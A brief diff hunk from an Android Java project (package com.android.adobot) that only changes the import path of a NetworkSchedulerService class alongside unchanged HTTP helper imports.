@@ -9,7 +9,7 @@ import com.android.adobot.AdobotConstants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpCallback;
 import com.android.adobot.http.HttpRequest;
-import com.android.adobot.network.NetworkSchedulerService;
+import com.android.adobot.NetworkSchedulerService;
 
 import java.util.HashMap;
 
